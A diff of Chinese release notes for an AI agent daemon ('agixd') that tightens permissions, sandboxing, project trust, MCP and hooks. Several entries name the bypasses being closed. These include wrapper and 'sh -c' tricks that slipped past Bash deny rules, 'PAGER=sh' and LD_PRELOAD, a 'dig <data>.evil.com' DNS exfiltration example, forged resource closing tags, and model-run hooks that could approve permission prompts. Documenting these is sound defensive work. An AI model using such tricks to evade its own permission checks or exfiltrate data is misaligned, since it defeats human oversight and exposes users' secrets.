@@ -395,7 +395,11 @@ WebAssembly 载体整个移除。
 
 ## 0.3.9 之后:到 0.3.10
 
-### 部署 `agixd` 的、RPC 客户端
+按谁要动手分成三类,每类下按领域分组;一件事只写在一处。0.4 要翻的缺省汇总在末尾。
+
+### 部署 `agixd` 的
+
+#### 权限与沙箱
 
 - **`auto`、`yolo` 就是 `bypassPermissions`。** settings.json 的 `permission_mode`、
   `options.permission_mode`、agent 类型 frontmatter 里写这两个,得到的都是完全放行,报回来是
@@ -404,46 +408,20 @@ WebAssembly 载体整个移除。
   或 `default` 加 allow 规则。
 - Agent 工具(团队成员)和 `TeamCreate` 的 `permission_mode` 不再拒收 `auto`,按
   `bypassPermissions` 处理;`bubble` 照旧拒收。
-- `ExitPlanMode` 回到 `EnterPlanMode` 之前的模式,不再一律回 `default`。
-- 计划模式里的 `ExitPlanMode` 不再被"plan mode forbids non-readonly tools"拒掉,而是照常询问
-  (`prompt`,`tool_name: "ExitPlanMode"`):`permit` 退出,`deny` 留在计划模式。以前计划模式
-  经 RPC 退不出来。
-- `session.resume` 对活着的会话报它此刻的 `permission.mode`(进了、退了计划模式之后的),
-  不再报建会话时的。
 - `Bash` 的 deny / ask 规则按实际启动的程序再比一次(`"rm"`、`\rm`、`{rm,x}`、`/bin/rm`、
   `command -p rm`、`env` / `exec` / `sudo` / `nice` / `time` / `timeout` / `xargs` 包着的、
   `sh -c` / `eval` / `find -exec` 里的都算 `rm`);程序名读不出来的命令(`$CMD x`)在有带
   内容的 deny / ask 规则时改为询问(`dontAsk` 下拒绝)。以前它们按原文前缀匹配,都绕得过去。
   allow 规则不变。带引号的受保护路径(`~/".ssh"/id_rsa`)同样按受保护路径拒绝。
+- `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
+  here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
+  deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
+  `caffeinate` / `su -c` / `runuser -- ` 等 wrapper 剥掉后比里面真正启动的程序。
+- `Bash(...)` 的 deny / ask 规则同样管住 `Monitor`(此前只按工具名匹配,`Monitor` 逃得过)。
+  一个 `Monitor` 名下的 allow 不受影响,被 `Bash` 名下的 deny/ask 收紧。
 - 只读 `Bash` 命令的免询问更窄:参数里有 `$VAR`、`~`、替换的,`cd` / `pushd` 到不是项目内
   字面路径之后再读的,现在要询问。`echo $HOME` 这类也在其中。`cd -`、`popd`、`pushd +N`(落到
   `$OLDPWD` / 目录栈,命令没写出目的地)之后再按相对路径读的,同样要询问。
-- 只读白名单里会**拉起别的程序**的命令不再免询问:`rg --pre` / `--search-zip` / `-z`、
-  `fd -x` / `-X` / `--exec` / `--exec-batch`、`git grep -O`、`man -P` / `-H`、`bat --pager`、
-  `sort --compress-program`,以及 `git -c …`(能设 `core.pager` / `core.fsmonitor` / 外部 diff)、
-  `git log --ext-diff`。`cargo build` / `cargo check`(会跑 `build.rs` 与过程宏)移出只读前缀。
-  设 `PATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PAGER` / `MANPAGER` / `GIT_PAGER` /
-  `LESSOPEN` 等变量(`PAGER=sh man ls`、`PATH=.; ls`)也一样要询问。
-- 只读白名单里会**写文件 / 改仓库**的命令不再免询问:`sort` / `shuf` / `tree` 带 `-o`、
-  `uniq` / `xxd` 带第二个位置参数、`yq -i`,以及 `git config` 带值(或 `--unset` / `--add` /
-  `--edit` / `set`)、`git branch -d/-D/-m/-f/-u/<新名>`、`git tag -d/<新名>`、
-  `git remote add/remove/set-url/rename/prune`、`git diff/log/show --output`。`git config key`
-  (读)、`git branch` / `git tag` / `git remote` 的列示形式仍是只读。
-- `mcp.addServer` / `mcp.updateServer` 不再把密钥写进要提交的 settings.json:`config` 的
-  `headers` 与 `env` 写进同目录的 `settings.local.json`(0600),其余照旧写 settings.json,响应多了
-  `secrets_written_to`(改了 settings.local.json 时才有)。settings.json 里这个 server 早先写进去的
-  `headers` / `env` 在下次写它时被替换掉;已经提交过的,记得轮换。`mcp.updateServer` 认只在
-  settings.local.json 里声明的 server。
-- `--features otel` 构建的 OTLP/HTTP 导出(端口不是 4317 的端点)以前什么也没发出去——没有
-  HTTP 客户端,建导出器时就失败了,只记一条 warn。现在照常发送,端点按 collector 的根地址处理:
-  trace 发到 `<端点>/v1/traces`,指标发到 `<端点>/v1/metrics`。原来写成
-  `http://collector:4318/v1/traces` 这种带信号路径的,改成根地址。
-- `turn_complete` 多了可选的 `truncated: true`:OpenAI 兼容的流既没有 `[DONE]` 也没有
-  `finish_reason` 就关了时出现(仍当作回复结束,daemon 另记一条 warn),回复可能不完整;遥测
-  `api_request` 上同样标 `truncated: true`。其余情况没有这个键。
-- `dig`、`ping` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名
-  发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写
-  `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
 - **只读 `Bash` 的判定改用 deny 规则那套调用解析**(`permissions::invocation`):行里启动的
   每个程序都要按名字(不带路径)在只读名单里,读不出程序的(`$CMD x`、看不懂的 wrapper 选项)
   不算只读。以前免询问、现在要询问(`plan` 下拒绝)的:wrapper 的选项吃掉了名字的
@@ -469,33 +447,31 @@ WebAssembly 载体整个移除。
 - 只读命令参数里的 glob 按它此刻在磁盘上匹配到的路径检查:`cat .*/x`(macOS 的 bash 3.2 让
   `.*` 匹配 `..`)、`cat link*/x`(符号链接指到项目外)要询问,匹配超过 512 个路径的也询问。
   `cd -` / `popd` 之后再 `cd` 一个相对路径,不再当作回到了已知的目录。
-- `nslookup`、`traceroute` 移出只读白名单(与 `dig`、`ping` 同理);`cargo metadata`、
-  `cargo tree`、`cargo --version` / `cargo version`、`rustc --version`、`rustup show` 移出只读
-  前缀:前两个要问 rustc,项目的 `.cargo/config.toml` 能把它换成任意程序
-  (`build.rustc-wrapper`,`cargo metadata` 还会写 `Cargo.lock`);后几个跑的是
-  `rust-toolchain.toml` 指定的工具链,它可以是一个路径。要免询问的,写 allow 规则。
+- 只读白名单里会**拉起别的程序**的命令不再免询问:`rg --pre` / `--search-zip` / `-z`、
+  `fd -x` / `-X` / `--exec` / `--exec-batch`、`git grep -O`、`man -P` / `-H`、`bat --pager`、
+  `sort --compress-program`,以及 `git -c …`(能设 `core.pager` / `core.fsmonitor` / 外部 diff)、
+  `git log --ext-diff`。`cargo build` / `cargo check`(会跑 `build.rs` 与过程宏)移出只读前缀。
+  设 `PATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PAGER` / `MANPAGER` / `GIT_PAGER` /
+  `LESSOPEN` 等变量(`PAGER=sh man ls`、`PATH=.; ls`)也一样要询问。
+- 只读白名单里会**写文件 / 改仓库**的命令不再免询问:`sort` / `shuf` / `tree` 带 `-o`、
+  `uniq` / `xxd` 带第二个位置参数、`yq -i`,以及 `git config` 带值(或 `--unset` / `--add` /
+  `--edit` / `set`)、`git branch -d/-D/-m/-f/-u/<新名>`、`git tag -d/<新名>`、
+  `git remote add/remove/set-url/rename/prune`、`git diff/log/show --output`。`git config key`
+  (读)、`git branch` / `git tag` / `git remote` 的列示形式仍是只读。
+- `dig`、`ping`、`nslookup`、`traceroute` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写 `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
+- `cargo metadata`、`cargo tree`、`cargo --version` / `cargo version`、`rustc --version`、`rustup show` 移出只读前缀:前两个要问 rustc,项目的 `.cargo/config.toml` 能把它换成任意程序(`build.rustc-wrapper`,`cargo metadata` 还会写 `Cargo.lock`);后几个跑的是 `rust-toolchain.toml` 指定的工具链,它可以是一个路径。要免询问的,写 allow 规则。
 - **`acceptEdits` 不再放行发往未列出主机的 `WebFetch` / `Ping`。** 只有 `sandbox.allowed_domains`
   列出的主机(含子域)免询问,其余与 `default` 一样询问——URL 本身就能把数据带出去。
   其余只读调用照旧放行(含读项目外的文件)。
-- `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
-  here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
-  deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
-  `caffeinate` / `su -c` / `runuser -- ` 等 wrapper 剥掉后比里面真正启动的程序。
-- `Bash(...)` 的 deny / ask 规则同样管住 `Monitor`(此前只按工具名匹配,`Monitor` 逃得过)。
-  一个 `Monitor` 名下的 allow 不受影响,被 `Bash` 名下的 deny/ask 收紧。
-- `Bash` 超时不再丢输出:命令被停掉前打印的内容照样返回,末尾标 `[timed out after Nms]`
-  (`is_error`),结构化结果多了 `timed_out`。以前超时直接以错误结束,已打印的全丢了。
-- `Bash` 单行超过 64 KB 时截断并标 `…[line truncated]`,然后继续读后面的行;以前到那一行就
-  静默丢掉之后的全部输出。
+- `plan` 模式下,只读工具自己没放行的调用改为询问,与 `default` 相同:读项目外的文件、
+  `WebFetch`、只读的 MCP 工具、参数指向项目外的只读 `Bash`。以前 `plan` 对只读工具一律放行。
+- `Monitor` 不再恒为只读,按它的命令用 `Bash` 的只读分类判:跑脚本、起服务的 `Monitor` 在
+  `plan` 下被拒,在 `acceptEdits` 下要询问(以前两处都静默放行)。
 - 无人值守会话里,`Monitor` 的脚本在 OS 沙箱完整生效时自动放行(与 `Bash` 同一条件),以前恒为
   询问、也就是恒被拒。新设置 `sandbox.unattended_requires_network_policy`(缺省 `false`)打开后,
   `Bash` 与 `Monitor` 的这条自动放行另外要求 `sandbox.network_mode` 不是 `unrestricted`——沙箱只限写,
   网络仍是个口子;不满足就回到 allow 规则。0.4 会把缺省改成 `true`,无人值守跑命令的部署现在就可以
   把网络收成 `deny_all` / `allowlist` 并打开它。
-- `plan` 模式下,只读工具自己没放行的调用改为询问,与 `default` 相同:读项目外的文件、
-  `WebFetch`、只读的 MCP 工具、参数指向项目外的只读 `Bash`。以前 `plan` 对只读工具一律放行。
-- `Monitor` 不再恒为只读,按它的命令用 `Bash` 的只读分类判:跑脚本、起服务的 `Monitor` 在
-  `plan` 下被拒,在 `acceptEdits` 下要询问(以前两处都静默放行)。
 - 子进程环境永远不带 `CDPATH`(`inherit` 与 `allowlist` 两种模式都剥掉),免得子 shell 的
   `cd foo` 落到项目外、而权限检查看的是字面 `foo`。
 - 沙箱里命令的 `TMPDIR` 从 `<系统临时目录>/agix-<会话 id>` 挪到 `<状态目录>/tmp/<会话 id>`
@@ -525,19 +501,6 @@ WebAssembly 载体整个移除。
   `session.respondToPrompt`。让 hook 或 MCP 服务器回调 daemon 的,改由宿主转一手。`--token`
   写在命令行上时 `ps` 里看得见,Linux 上沙箱里的命令可以拿它连 TCP 端口——用
   `AGIX_DAEMON_TOKEN` 传。
-- **hook 的 `if` 对 `Bash` / `Monitor` 按实际启动的程序比**(`hooks.md`"`if`"一节),与 deny
-  规则同一套读法:`Bash(rm:*)` 现在也命中 `cd . && rm x`、`"rm" x`、`/bin/rm x`、`env rm x`、
-  `bash -c 'rm x'`,以及程序名读不出来的命令(`$CMD x`)。以前只比整行原文的前缀,这些都绕得过;
-  配了这类 `if` 的 hook 会比以前跑得多。
-- **`prompt` / `agent` hook 的批准缺省不再算数。** 模型回 `"decision": "approve"`、子 Agent 回
-  `"ok": true`,以前在 `PreToolUse` 上等于替人答应了权限询问(无人值守也一样);现在什么都不说,
-  询问照常发给宿主。要它照旧算数的,在那条 hook 上写 `"may_approve": true`。它们说 `block` /
-  `ok: false` 照旧拦下;`command` 与 `http` hook 的 `approve` 不变。
-- **未信任的项目里,command hook 不以相对路径起程序。** 全局层、场景层的 hook 写
-  `./scripts/check.sh`、`scripts/x.sh`、`bash x.sh`、`. ./env.sh` 的,在未信任的项目里不跑,算
-  hook 失败(`on_error` 照旧);继承的 `PATH` 里的 `.` 与空条目也不给它们用。以前它们在项目目录里
-  执行,跑的是仓库放在那个路径上的文件。自己的脚本改写绝对路径或放进 `~/.agix/hooks/` 写裸名;
-  信任的项目不变(0.3.x 缺省信任)。
 - agent 类型 frontmatter 的 `permission_mode` 真正作用到子 Agent 的权限判定上(以前写 `plan`
   不起作用),可以比父会话宽也可以严;父会话在 `plan` 时取两者中更严的那个,父会话是
   `bypassPermissions` 时随父会话,插件带来的类型只能收紧。团队成员(`TeamCreate`、`Agent` 的
@@ -547,42 +510,70 @@ WebAssembly 载体整个移除。
   询问上答 `permit_always`,记下的是那一条命令或路径,不再是整个工具。
 - 子 Agent 能改它自己读过的已有文件了:以前读后再写的检查查的是父会话的读取记录,子 Agent 的
   `Edit` / `Write` 改已有文件总被"File must be read before editing"拒掉。
-- skill 正文里的 `` !`cmd` `` 先过会话权限(按一次 `Bash` 调用):被 deny 规则拒的、要询问的
-  不再执行,替换成写明原因的一行文字。要它照跑,给那条命令写 allow 规则;项目内的只读命令照旧
-  直接执行。skill 自己的 `allowed-tools` 不覆盖它自己的 `` !`cmd` ``。
-- 运行中新建或改动的 `<project>/.agents/skills/` 下的 skill 按项目 skill 对待(不带内容的
-  `allowed-tools` 授权不生效),即使用户层有同名的 skill。以前热重载把它记成用户 skill。
 - `permit_always` 的 `local` 第一次建出 `settings.local.json` 后,之后新建的会话不用
   `config.reload` 就能看到那条规则。
-- **`feature_flags` 整段删除。** 还在起作用的两项挪进 `compaction`:`reactive_compact` 改成
-  `compaction.reactive`,`cached_microcompact` 改成 `compaction.cached_microcompact`,含义不变、
-  默认都关。`feature_flags` 留在配置里照样能加载,但整段被忽略——开着这两项的要搬过去。
-  `team_mode`、`plugin_marketplace`、`extended_memory`、`experimental_agent`、
-  `recorder_auto_detect`、`dream_task` 从来没有生效;`AGIX_FEATURE_*` 环境变量同样从未生效。
-- 工具 `VerifyPlanExecution` 删除:它要读的计划正文从没有地方写入,调用总是报
-  "No active plan found"。
-- `session.export` 的 `runtime.json` 去掉 `plan_text`(一直是 `null`)。
+
+#### 项目信任
+
+- **项目信任(`ARCHITECTURE.md` §6.6)。** 全局设置多了 `project_trust: { default, trusted }`。
+  没被信任的项目按插件级信任处理:它的 `permission_mode` / 规则 / 沙箱设置只能收紧,
+  `hooks_config`、`mcp_servers`、`scripts` 不生效,`.agix/hooks/` 不进 hook 的 `PATH`,
+  `.agix/agents/` 里的类型只能收紧、不替换同名类型,`.agents/skills/` 里的 `` !`cmd` `` 不执行。
+  **0.3.10 缺省 `default: "trusted"`,什么都不变**;`daemon.doctor` 多了一项 `project.trust`,
+  项目里有要信任才生效的东西而只靠缺省被信任时报 `degraded`,把它们列出来。
+  `project_trust` 只从全局层读,场景层、项目层里写的忽略。
+- 未信任的项目同样扣下决定东西送到哪里的键:`providers`(整段)、指向项目自己 provider 的
+  `default_provider` / `task_models` 条目、`model.base_url` / `model.auth_token`、`telemetry_url`、
+  `recorder`、`instruction_file`,以及放进更多插件的 `plugins` 值;它的 skill 的 `allowed-tools`
+  不授予任何东西;全局层、场景层里相对路径的脚本绑定在未信任的项目里不绑定。这些都列进
+  `requires_trust`,所以只改了 `providers.*.base_url` 的仓库也会让宿主弹出信任对话框。
+  **自己往项目层写 provider、模型端点的部署**(在项目的 `.agix/settings.json` 里写 `model`、
+  `providers` 的宿主)在 0.4 之前要把这些项目目录写进 `trusted`,否则翻缺省之后它们不生效。
+- **未信任的项目里,command hook 不以相对路径起程序。** 全局层、场景层的 hook 写
+  `./scripts/check.sh`、`scripts/x.sh`、`bash x.sh`、`. ./env.sh` 的,在未信任的项目里不跑,算
+  hook 失败(`on_error` 照旧);继承的 `PATH` 里的 `.` 与空条目也不给它们用。以前它们在项目目录里
+  执行,跑的是仓库放在那个路径上的文件。自己的脚本改写绝对路径或放进 `~/.agix/hooks/` 写裸名;
+  信任的项目不变(0.3.x 缺省信任)。
+- **0.4 会把 `project_trust.default` 改成 `untrusted`**(预告见本节末)。现在就该做的:桌面宿主在打开项目时
+  调 `project.status`,`requires_trust` 不空就问用户、用 `project.trust` 记下回答;自己创建项目
+  目录的无人值守部署(写项目层 `mcp_servers` / `permission_mode` 的那种)在全局
+  `settings.json` 里写 `"project_trust": {"trusted": ["<项目目录>/**"]}`。可以先把 `default` 设成
+  `untrusted` 试跑,`daemon.doctor` 与 `project.status` 会说哪些东西被扣下了。
+- 设置文件里一个值类型不对(`"language": 5`)不再让整份合并结果退回内建缺省(连全局层的 hook、
+  沙箱设置一起丢掉):只丢这个值,warn 一条,`daemon.doctor` 的 `settings.tiers` 报 `degraded`,
+  `settings_tiers[].ignored_values` 列出它。以前靠"写错一个值就等于什么都没配"的,现在其余的
+  值都生效。
+
+#### MCP 与 OAuth
+
 - **MCP 的 OAuth 换了一套**(`mcp_auth.md`)。`mcp_servers` 里的 `oauth_provider` 删除:写了它
   的 server 配置整条被拒绝(启动与重载时发 `mcp_connect_failed`,`mcp.addServer` 报
   `INVALID_PARAMS`),报错里给出新写法。改成 `"oauth": {"client_id", "client_secret_env",
   "scopes", "callback_port"}`(都可省);只是想让要求登录的 server 能登录,什么都不用写。
   以前 `oauth_providers` 里的密钥字面量没有对应写法:放进环境变量,`client_secret_env` 写变量名。
   以前存在 `scenes/<id>/mcp/oauth/<provider>.json` 的令牌不再读取,要重新登录一次。
-- 新方法 `mcp.auth.start` / `mcp.auth.complete` / `mcp.auth.cancel` / `mcp.auth.logout`,新通知
-  `mcp_auth_required` / `mcp_auth_completed` / `mcp_auth_failed`,新错误码 `MCP_AUTH_FAILED`
-  (-32021)。`mcp.status` 的元素多了 `auth`,`state` 多了 `auth_required`。
 - 传输错误不再清掉 OAuth 令牌(以前任何一次重连都会清);`mcp.addServer` / `mcp.updateServer`
   加进来的 server 和启动时连的一样走 OAuth。
 - 无人值守的 MCP server:`oauth.grant` 为 `client_credentials`(`client_secret_env` 或
   `private_key_jwt`)或 `enterprise`(企业托管授权;身份经新方法 `mcp.auth.setIdentity` 给)。
 - MCP 策略文件多了两个可选键:`allowed_authorization_servers`(授权服务器 issuer 的 glob)与
   `enterprise_idp`。`daemon.doctor` 的 `mcp.policy` 详情相应多了这两项。
-- **MCP 工具名按 API 的规则造。** 工具名(与 prompt 斜杠命令)是 `mcp__<server>__<tool>`,
-  两段里 `[A-Za-z0-9_-]` 以外的字符换成 `_`;server 名有这种字符或长过 40 的,后面再接 `_`
-  加六位哈希(`my server` → `mcp__my_server_<hash>__…`);整个名字超过 64 时工具段截短并接哈希。
-  只用这些字符、不长的 server 名不变。名字怪的 server,权限规则要按新名字写,`MCP` 工具会列出
-  每个工具的名字。工具的 `inputSchema` 顶层不是 `type: object` 的,
-  按 object 报给模型。
+- **MCP 策略里 `allowed_servers` 的 `name` 规则不再放行任何 server**,`name` 只在
+  `denied_servers` 里起作用。只靠 `{"name": …}` 放行的策略现在拒绝这些 server(拒绝原因会说
+  明),`daemon.doctor` 的 `mcp.policy` 报 `degraded` 并在 `inert_allowed_rules` 里列出它们;
+  改成 `command` / `url` 规则。`url` 规则匹配前把 `ws://` / `wss://` 当作 `http://` /
+  `https://`、去掉主机名末尾的 `.`(规则里写的 `ws://` / `wss://` 同样换过来),
+  `denied_servers` 因此也拦得住 WebSocket 回退和 `evil.example.` 这种写法。
+- **项目层的 MCP server 读不了 daemon 的环境。** 项目 `.agix/settings.json` /
+  `settings.local.json` 里声明或改过的 server——包括 `mcp.addServer` / `mcp.updateServer` 写进去
+  的——`command` / `args` / `url` / `headers` 里的 `$VAR` 只用它自己 `env` 块的值展开,`env` 块
+  的值本身不展开;`oauth` 里写 `client_secret_env` / `private_key_jwt.key_env` 的不连接
+  (`mcp_connect_failed`,`mcp.addServer` 报 `INVALID_PARAMS`)。靠 `$GITHUB_TOKEN` 这类变量的
+  项目 server,把值写成字面量,或把 server 挪到全局层 / 场景层;全局层、场景层、插件声明的
+  server 照旧。项目放在 `$HOME`、`.agix` 就是全局目录的,按全局层算。
+- `"type": "in_process"` 的 MCP server 配置不再被接受(从来没有实现过,连接必然失败),以
+  `invalid config` 报出。`"type": "websocket"` 现在与 `web_socket` 同义。
+- **MCP 工具名按 API 的规则造。** 工具名(与 prompt 斜杠命令)是 `mcp__<server>__<tool>`,两段里 `[A-Za-z0-9_-]` 以外的字符换成 `_`;server 名有这种字符或长过 40 的,后面再接 `_` 加六位哈希(`my server` → `mcp__my_server_<hash>__…`);server 名含 `__` 或以 `_` 结尾的同样走这条(`a__b` 的工具叫 `mcp__a_b_<6 位哈希>__…`),本来就要哈希、清洗后以 `_` 结尾的名字(如 `docs.`)不再带那个 `_`;整个名字超过 64 时工具段截短并接哈希。只用这些字符、不长的 server 名不变。名字怪的 server,权限规则要跟着新名字写,`MCP` 工具会列出每个工具的名字。工具的 `inputSchema` 顶层不是 `type: object` 的,按 object 报给模型。
 - **MCP 有了时限。** `mcp_servers.<name>` 可带 `startup_timeout_ms` / `tool_timeout_ms`;
   缺省取环境变量 `MCP_TIMEOUT` / `MCP_TOOL_TIMEOUT`,再缺省 30 秒 / 10 分钟。握手不回、只回
   非 JSON 的 server 到时被停掉、报 `mcp_connect_failed`,不再把会话创建卡死;工具调用超时在
@@ -590,13 +581,100 @@ WebAssembly 载体整个移除。
   会话在下一轮前换上。
 - **MCP 工具调用断在途中不再重发。** server 在调用中途退出,这次调用报错(以前重连后再发一次,
   有副作用的工具会执行两遍);下一个请求重连。
-- `mcp.status` 的 `state` 多了 `disconnected`、`connecting`、`failed`(带 `error`);
-  `mcp_connect_failed` 的 `error` 写明原因,不再是"看 daemon 日志"。
-- `session.run_turn` 的 `message` 为空或只有空白、又没有附件,报 `INVALID_PARAMS`,不再当作
-  一轮发给模型。
+- 工具调用之后不再把每个 MCP server 的工具都重列一遍:只有发了 `tools/list_changed`(或断线
+  后重连上)的 server 才在下一步重列,发了 `prompts/list_changed` 的重读它的 prompt;
+  `resources/list_changed` 不触发任何事。重列失败的 server 保留原来的工具,不再让整组工具
+  消失;重列得到空列表的,工具清空。
+- `config.reload` 的 `routing` 多了 `mcp_connecting`:重连最多等 10 秒,没连完的在后台接着连,
+  结果随后以通知到达。命令不存在、没有执行权限、URL 解析不了的 MCP server 不再退避重试
+  (以前每个要等十几秒)。
+- 消息里 `@server:uri` 内联的资源:`server` / `uri` 属性做了转义,正文里的 `</mcp-resource`
+  被拆开,资源伪造不了闭合标签;MIME 不是 `image/*` 的二进制资源显示为
+  `[binary resource: <mime>, <n> bytes]`,不再标成图片。
+- MCP OAuth 回调带 `error` 时同样要求 `state` 相符;不符的被拒,登录继续等真正的回调。以前
+  任何本机进程发一个 `?error=x` 就能把进行中的登录作废。
+- MCP stdio server 的进程组记进孤儿登记:daemon 被 `SIGKILL` 之后,下次启动会把它们清掉。
+- 只读且幂等的 MCP 工具结果超过 256 KB 的不再缓存。
+- 登录之后重连失败的 `mcp_connect_failed` 的 `error` 带上失败原因。
+- 无人值守的 MCP server(`client_credentials`、`enterprise`)拿到的令牌寿命短于 30 秒左右时,
+  调用不再间歇地以"需要授权"失败:令牌何时重新取由 daemon 决定,底层的 OAuth 客户端不再因为
+  它"快到期"而拒绝使用刚取到的令牌。
+- MCP server 返回的单张图片解码后超过 3.5 MB 的,换成一行 `[image omitted: …]`,不再原样
+  转给模型(超过 API 的单图上限,这一请求和之后每一个带着它的请求都会被拒)。`Read` 读超过
+  3.5 MB 的图片同样报错,不再按 10 MB 的读文件上限放行。
+
+#### hooks
+
+- **command hook 的退出码按 0 / 2 / 其他来读**(`extension_points.md` 生命周期 hook 一节)。
+  `exit 2` 一律拦下,理由取 stderr(为空取 stdout),stdout 不再当 JSON 读——以前 `exit 2`
+  同时往 stdout 打了不是 JSON 的东西就被放行。`exit 1` 等其他非零放行并记 warn——以前
+  非零退出、stdout 为空就拦下。靠 `exit 1` 拦的 hook 改成 `exit 2`。
+- 没写 `timeout` 的 hook 最多跑 60 秒(以前 10 分钟);agent 型 hook 的 `timeout` 以前不生效,
+  现在生效。要更久的写明 `timeout`。
+- **hook 的 `if`**(`hooks.md`"`if`"一节)对 `Bash` / `Monitor` 按实际启动的程序比,与 deny 规则同一套读法:`Bash(rm:*)` 现在也命中 `cd . && rm x`、`"rm" x`、`/bin/rm x`、`env rm x`、`bash -c 'rm x'`,以及程序名读不出来的命令(`$CMD x`)。以前只比整行原文的前缀,这些都绕得过;配了这类 `if` 的 hook 会比以前跑得多。另外 `""` 与 `"*"` 命中一切(以前什么都不命中,hook 从不跑);`Edit|Write` 几选一;prompt、http、agent 三种 hook 也认 `if`(以前被忽略,对所有调用都跑)。
+- `once` 只在 hook 真正跑了之后才算用掉;以前 `if` 没命中的那次调用就把它用掉了。
+- 超时、出错的 hook 在日志里记一条 warn(以前除了 command 超时都没有痕迹)。
+- **hook 的批准。** `PreToolUse` hook 答 `decision: "approve"` 就不再问人:权限检查要询问的调用直接放行(无人值守会话同样),规则拒绝的照样拒绝,别的 hook 说 `block` 照样拦;以前 `approve` 解析了但不起作用。这对 `command` 与 `http` hook 成立;**`prompt` / `agent` hook 的批准缺省不算数**——模型回 `"decision": "approve"`、子 Agent 回 `"ok": true`(记为 `approve`)不会替人答应权限询问(以前会,无人值守也一样),询问照常发给宿主。要它算数的,在那条 hook 上写 `"may_approve": true`。它们说 `block` / `ok: false` 照旧拦下。
+- **`Stop` hook 的 `decision: "block"`(或 command `exit 2`)不再被忽略**:这一轮不结束,
+  `message` 作为提醒交给模型接着做;再停下时 `Stop` 再问一遍,payload 带 `stop_hook_active: true`。
+  只想记录的 `Stop` hook 若回了 `block`,现在会让模型多跑一轮。
+- **`TaskCompleted` 在任何运行中任务结束时都发**(完成、失败、被停下),与 `TaskCreated` 成对,`reason` 是这个任务的 JSON(`task_id`、`kind`、`status`……)。团队成员(`TeamCreate` 的、`Agent` 带 `team_name` 的)一轮正常结束时另发一次 `TaskCompleted`,payload 带 `team_name`、`teammate_name`;`TeammateIdle` 在同一时刻发,也带这两项。两者都不再要求配了 `Stop` hook。只想要团队成员那次的 hook,看 payload 里有没有 `team_name`,或改用 `TeammateIdle`。
+- 子 Agent 用父会话的 hooks:`once` 在整棵会话树里只算一次(以前每个子 Agent 各算一次),
+  `FileChanged` 一次修改只触发一次(以前每起过一个子 Agent 就多触发一次)。`SubagentStart` /
+  `SubagentStop` 在后台 `Agent`、`context: fork` 的 skill、`session.startAgent`、常驻团队成员上
+  也会发(以前只有前台 `Agent` 与 `TeamCreate`);常驻成员的 `SubagentStop` 在它被停掉时发,
+  `stop_reason` 为 `shutdown`;取消的子 Agent 报 `cancelled`。
+- `FileChanged` 也监视会话载入的 `AGENTS.md`(以前只看显式的 `instruction_file`)。
+- hook payload 的 `permission_mode`、`cwd` 不再为空:工具分发里发的 `PostToolUseFailure`、
+  `PermissionRequested`、`PermissionDenied`、`Notification`、`WorktreeCreate/Remove` 以及
+  `TaskCreated` 带上会话当前的模式;`SubagentStart/Stop` 带子 Agent 自己的 cwd 与模式;
+  `FileChanged`、`Elicitation` 与 rewake 的 `WakeEvent` 带上会话 id、项目根与模式(以前
+  `session_id` 为空、`cwd` 是 daemon 进程的工作目录或空、模式写死 `default`)。
+- `agent` hook 的 `model` 生效:子 Agent 跑在这个模型上,按会话的路由选 provider。以前这个字段
+  被忽略,子 Agent 用会话的模型。
+- hook 回答里的 `suppress_output` 不再是一个字段(写了也不报错):引擎从不把 hook 的 stdout
+  交给模型或宿主,没有可隐藏的。
+- `async_rewake` 在 daemon 里生效:会话的运行中任务(子 Agent、后台命令、Monitor)有一个结束,
+  就算唤醒信号,等着的 hook 在会话处理下一条输入之后、等再下一条之前重跑。以前 daemon 不接
+  唤醒通道,这类 hook 永远不会重跑。
+- hook 新增 `on_error`(四种后端都认):缺省 `"allow"`,失败照旧放行;写 `"block"` 的,超时、
+  出错、command 退出码不是 0 或 2、回答不是 JSON,都等于它回答了 `decision: "block"`,理由写明
+  是哪个 hook、怎么失败的(`hooks.md`"失败"一节)。
+- HTTP hook 防内网的检查补全:`0.0.0.0`、`[::ffff:127.0.0.1]`、`127.1`、十进制写法、带
+  `user@` 的 url、IPv6 私有段与 CGNAT 都拒;重定向的每一跳都查。
+- HTTP hook 新增 `allow_local`(缺省 `false`):写 `true` 的可以指向本机或内网,只放开 url 里的
+  主机与端口,重定向到别的内部目标照旧被拒。
+
+#### 模型与回合
+
 - 模型调用的恢复对真实厂商生效了:过载(重试用尽的 529,或流里的 `overloaded_error`)配了
   `model.fallback_model` 就换它重发;尺寸被拒(400「prompt is too long」、413、流里的同类错误)
   压缩后重发。以前这些都直接以 `ENGINE_ERROR` 结束。
+- 模型请求在开始回答之前收到 500 / 502 / 504 / 408 的,按退避再发(两个协议都是),和 429、
+  503、529 一样;以前直接失败。
+- Anthropic 的 `base_url` / `ANTHROPIC_BASE_URL` 写到 `…/v1` 或写全 `…/v1/messages` 都可以,
+  不再拼成 `…/v1/v1/messages`。
+- OpenAI 兼容 provider 报回的 `input_tokens` 不再含已缓存的那部分(那部分在
+  `cache_read_input_tokens`),和 Anthropic 的含义一致;以前缓存命中的部分算了两遍,
+  `context.tokens` 与按 token 估的花费都偏大。
+- Anthropic 原生搜索不再带 `anthropic-beta: web-search-20250305-2025-03-05`(`web_search_20250305`
+  不需要 beta)。
+- `pause_turn` 不再结束一轮:引擎把那条回复发回去让模型接着写。
+- 一次调用在回复要工具之前失败,它推过的 `text_delta` 不进 transcript;重发前会再发一次同
+  `step` 的 `step_start`(协议 §7)。流在消息结尾之前断开,以前当作一个空回答正常结束
+  (`stop_reason` 为空、用量为 0),现在是 `ENGINE_ERROR`。
